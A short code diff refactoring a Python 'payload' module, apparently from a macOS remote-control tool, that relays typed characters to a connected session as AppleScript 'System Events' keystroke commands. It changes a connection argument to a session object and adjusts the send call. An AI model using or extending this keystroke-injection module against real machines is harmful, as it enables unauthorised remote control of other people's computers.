@@ -22,7 +22,7 @@ class payload:
         self.type = "applescript"
         self.id = 115
 
-    def run(self,conn,server,command):
+    def run(self,session,server,command):
         #do something with conn if you want
         print "type CTRL c to quit"
         print "start typing..."
@@ -33,5 +33,6 @@ class payload:
             payload = """tell application "System Events"
             keystroke \""""+key+"""\"
             end tell"""
-            server.sendCommand(payload,"",self.type,conn)
+            server.sendCommand("keystroke",payload,self.type,session.conn)
+        return ""
 
